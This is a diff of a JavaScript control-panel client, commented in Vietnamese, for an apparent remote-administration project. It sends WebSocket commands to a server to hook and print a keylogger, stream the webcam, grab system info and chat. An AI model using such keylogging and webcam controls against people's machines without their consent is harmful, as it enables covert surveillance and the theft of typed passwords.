@@ -3,12 +3,15 @@ let currentWindow = 0;
 let ws = null;
 let currentAction = ''; 
 let isInSubMenu = false; // Biến này dùng để check xem ta đang ở Main hay Sub
+let isKeylogHooked = false;
+let isWebcamActive = false;
 
 // Biến Parse Dữ liệu
 let parsingMode = null; 
 let expectedItems = 0;
 let currentItemsReceived = 0;
 let tempRowData = []; 
+let tempInfoHtml = "";
 
 // --- WEBSOCKET ---
 function initWebSocket() {
@@ -68,6 +71,11 @@ function handleServerMessage(msg) {
     } 
     else if (msg.type === "ERROR") {
         showToast(msg.msg, "error");
+    }
+    else if (msg.type === "CHAT") {
+        const data = msg.data;
+        addChatBubble(data, 'server');
+        return;
     }
     else if (msg.type === "LOG") {
         const data = msg.data; 
@@ -148,6 +156,41 @@ function handleServerMessage(msg) {
                     }
                 }
             }
+        }
+        if (parsingMode === 'INFO') {
+            const data = msg.data;
+            
+            if (data === "END_INFO") {
+                // Đã nhận xong toàn bộ -> Render ra màn hình
+                document.getElementById('systemInfoGrid').innerHTML = tempInfoHtml;
+                parsingMode = null;
+                showToast("System Info Updated", "success");
+            } 
+            else if (data.startsWith("KEY:")) {
+                // Parse format: "KEY:Label|Value"
+                const parts = data.substring(4).split('|');
+                if (parts.length >= 2) {
+                    const label = parts[0];
+                    const value = parts[1];
+                    
+                    // Chọn icon dựa trên label
+                    let icon = '💻';
+                    if (label.includes('CPU')) icon = '⚙️';
+                    if (label.includes('RAM')) icon = '💾';
+                    if (label.includes('Disk')) icon = '💿';
+                    if (label.includes('User')) icon = '👤';
+                    if (label.includes('OS')) icon = '🪟';
+
+                    tempInfoHtml += `
+                        <div class="info-card">
+                            <div class="info-icon">${icon}</div>
+                            <div class="info-label">${label}</div>
+                            <div class="info-value">${value}</div>
+                        </div>
+                    `;
+                }
+            }
+            return; 
         }
     }
 }
@@ -332,45 +375,67 @@ function updateStatus(connected) {
 function navigateTo(index) {
     if (currentWindow === index) return;
 
-    parsingMode = null; // Reset chế độ parse
+    // --- BƯỚC 1: DỌN DẸP TAB CŨ (Logic cũ giữ nguyên nhưng tinh chỉnh) ---
+    
+    // Nếu đang ở Keylog (2) hoặc Webcam (4) hoặc Chat (5) -> Gửi QUIT để thoát vòng lặp Server
+    if (currentWindow === 2 || currentWindow === 4 || currentWindow === 5 || isInSubMenu) {
+        
+        // Tắt Hook/Webcam nếu quên tắt (Logic an toàn từ bước trước)
+        if (currentWindow === 2 && isKeylogHooked) {
+            ws.send("CMD|UNHOOK");
+            isKeylogHooked = false;
+        }
+        if (currentWindow === 4 && isWebcamActive) {
+            ws.send("CMD|STOP");
+            isWebcamActive = false;
+            document.getElementById('liveIndicator').classList.remove('active');
+        }
 
-    // A. XỬ LÝ KHI RỜI TAB KEYLOG (Index 2)
-    if (currentWindow === 2) {
-        ws.send("CMD|UNHOOK");
-        setTimeout(() => {
-            ws.send("CMD|QUIT");
-            isInSubMenu = false;
-            performUITransition(index);
-        }, 200);
-        return;
-    }
-
-    // B. XỬ LÝ KHI RỜI TAB WEBCAM (Index 4)
-    // Webcam cần gửi STOP trước khi QUIT để giải phóng Camera
-    else if (currentWindow === 4) {
-        ws.send("CMD|STOP"); // Tắt camera
-        document.getElementById('liveIndicator').classList.remove('active');
-        setTimeout(() => {
-            ws.send("CMD|QUIT"); // Thoát menu Webcam
-            isInSubMenu = false;
-            performUITransition(index);
-        }, 200);
-        return;
-    }
-
-    // C. XỬ LÝ KHI RỜI TAB SCREENSHOT (Index 3)
-    // Screenshot cũng nằm trong vòng lặp while(true)
-    else if (currentWindow === 3) {
+        // Thoát menu hiện tại
         ws.send("CMD|QUIT");
         isInSubMenu = false;
     }
 
-    // D. CÁC TAB KHÁC (Process/App)
-    else if (isInSubMenu) {
-        ws.send("CMD|QUIT");
-        isInSubMenu = false;
-    }
+    // --- BƯỚC 2: THIẾT LẬP TAB MỚI ---
+    
+    // Reset chế độ parse dữ liệu
+    parsingMode = null;
+    
+    // Thực hiện chuyển cảnh UI
+    performUITransition(index); 
 
+    // [QUAN TRỌNG] Gửi lệnh vào Menu ngay lập tức
+    if (index === 2) { 
+        // Tab Keylog
+        ws.send("CMD|KEYLOG");
+        isInSubMenu = true; // Đánh dấu là đã vào menu con
+        console.log("Entered Keylog Menu");
+    } 
+    else if (index === 4) {
+        // Tab Webcam
+        ws.send("CMD|WEBCAM");
+        isInSubMenu = true;
+        console.log("Entered Webcam Menu");
+    }
+    else if (index === 5) {
+        // Tab Chat
+        ws.send("CMD|CHAT");
+        isInSubMenu = true;
+        setTimeout(() => startChatSession(), 300); // Chat có thể cần init UI
+    }
+    else if (index === 6) {
+        // Tab System Info
+        fetchSystemInfo();
+    }
+}
+function enterNewTab(index) {
+    // XỬ LÝ KHI VÀO TAB MỚI
+    if (index == 5) {
+        setTimeout(() => startChatSession(), 50);
+    }
+    if (index == 6) {
+        fetchSystemInfo();
+    }
     performUITransition(index);
 }
 
@@ -392,25 +457,22 @@ function performUITransition(index) {
 
 // --- ACTIONS KEYLOG ---
 function hookKeylog() {
-    // Logic an toàn cho Keylog
-    if(isInSubMenu) { ws.send("CMD|QUIT"); isInSubMenu=false; }
+    if (isKeylogHooked) return showToast('Keylog is already running', 'warning');
     
-    setTimeout(() => {
-        ws.send("CMD|KEYLOG");
-        isInSubMenu = true;
-        setTimeout(() => ws.send("CMD|HOOK"), 100);
-    }, 200);
+    // Chỉ gửi lệnh HOOK ngay lập tức
+    ws.send("CMD|HOOK");
+    
+    isKeylogHooked = true;
     showToast('Keylog Hooked', 'success');
 }
 
 function unhookKeylog() {
-    if(isInSubMenu) { ws.send("CMD|QUIT"); isInSubMenu=false; }
+    if (!isKeylogHooked) return showToast('Keylog is NOT running', 'error');
+
+    // Chỉ gửi lệnh UNHOOK
+    ws.send("CMD|UNHOOK");
     
-    setTimeout(() => {
-        ws.send("CMD|KEYLOG");
-        isInSubMenu = true;
-        setTimeout(() => ws.send("CMD|UNHOOK"), 100);
-    }, 200);
+    isKeylogHooked = false;
     showToast('Keylog Unhooked', 'warning');
 }
 
@@ -425,16 +487,14 @@ function printKeylog() {
     }
     output.scrollTop = output.scrollHeight;
 
-    setTimeout(() => {
-        ws.send("CMD|KEYLOG");
-        isInSubMenu = true;
-        setTimeout(() => ws.send("CMD|PRINT"), 100);
-    }, 200);
+    ws.send("CMD|PRINT");
+
 }
 
 function deleteLogs() {
     if(!confirm("Clear Keylog history on screen?")) return;
     document.getElementById('keylogOutput').innerHTML = '';
+    ws.send("CMD|DELETE");
     showToast('Screen history cleared', 'success');
 }
 
@@ -493,41 +553,50 @@ function deleteScreenshot() {
 
 // --- WEBCAM ACTIONS ---
 function startWebcam() {
-    // Thay đổi UI để hiển thị khung hình
+    if (isWebcamActive) return showToast('Webcam is already streaming', 'warning');
+
+    // Setup UI
     const container = document.getElementById('webcamVideo').parentNode;
-    
-    // Thay thế thẻ <video> bằng <img> để hiển thị MJPEG stream (Base64)
-    // Vì WebSockets gửi từng frame ảnh, dùng img src update sẽ mượt hơn
     if (!document.getElementById('webcamTarget')) {
         const img = document.createElement('img');
         img.id = 'webcamTarget';
         img.style.width = '100%';
         img.style.borderRadius = '10px';
-        img.style.boxShadow = '0 5px 20px rgba(0,0,0,0.1)';
-        document.getElementById('webcamVideo').style.display = 'none'; // Ẩn video gốc
         container.appendChild(img);
+        document.getElementById('webcamVideo').style.display = 'none';
     }
 
-    // Gửi lệnh
-    ws.send("CMD|WEBCAM"); // Vào menu Webcam
-    isInSubMenu = true;
+    // Chỉ gửi lệnh START (Server đã ở trong vòng lặp Webcam từ lúc chọn Tab)
+    ws.send("CMD|START");
     
-    setTimeout(() => {
-        ws.send("CMD|START"); // Bắt đầu stream
-        document.getElementById('liveIndicator').classList.add('active');
-        showToast("Webcam started", "success");
-    }, 300);
+    document.getElementById('liveIndicator').classList.add('active');
+    isWebcamActive = true;
+    showToast("Webcam started", "success");
 }
 
 function endWebcam() {
-    ws.send("CMD|STOP"); // Dừng stream
-    document.getElementById('liveIndicator').classList.remove('active');
+    if (!isWebcamActive) return showToast('Webcam is NOT running', 'error');
+    ws.send("CMD|STOP");
     
-    // Xóa ảnh đang hiện
+    document.getElementById('liveIndicator').classList.remove('active');
     const target = document.getElementById('webcamTarget');
     if(target) target.src = "";
     
+    isWebcamActive = false;
     showToast("Webcam stopped", "warning");
+}
+
+function fetchSystemInfo() {
+    document.getElementById('systemInfoGrid').innerHTML = '<div class="loading-text">⟳ Scanning System...</div>';
+    if (isInSubMenu) {
+        ws.send("CMD|QUIT");
+        isInSubMenu = false;
+    }
+    parsingMode = 'INFO';
+    tempInfoHtml = "";
+    setTimeout(() => {
+        ws.send("CMD|INFO");
+    }, 200);
 }
 
 // --- SYSTEM CONTROL ---
@@ -593,4 +662,47 @@ function showToast(message, type = 'info') {
             if (container.contains(toast)) container.removeChild(toast);
         }, 400);
     }, 3000);
+}
+
+// --- CHAT FUNCTIONS ---
+function startChatSession() {
+    // 1. Vào Menu CHAT
+    ws.send("CMD|CHAT");
+    isInSubMenu = true;
+    
+    // 2. Gửi lệnh hiện cửa sổ sau 1 chút
+    setTimeout(() => {
+        ws.send("CMD|START");
+        document.getElementById('chatMessages').innerHTML = '<div class="chat-bubble system">Connecting to chat service...</div>';
+    }, 300);
+}
+
+function sendChatMessage() {
+    const input = document.getElementById('chatInput');
+    const text = input.value.trim();
+    if (!text) return;
+
+    // Gửi lệnh: CMD | MSG | Nội dung
+    // Backend server.cpp cần xử lý prefix "MSG|"
+    ws.send(`CMD|MSG|${text}`); 
+    
+    // Hiện lên UI của mình
+    addChatBubble(text, 'me');
+    input.value = '';
+}
+
+function handleChatKey(e) {
+    if (e.key === 'Enter') sendChatMessage();
+}
+
+function addChatBubble(text, type) {
+    const container = document.getElementById('chatMessages');
+    const div = document.createElement('div');
+    
+    // Nếu là tin từ server, nó có thể có prefix "[Server]:", ta có thể lọc nếu muốn
+    div.className = `chat-bubble ${type}`;
+    div.textContent = text;
+    
+    container.appendChild(div);
+    container.scrollTop = container.scrollHeight;
 }
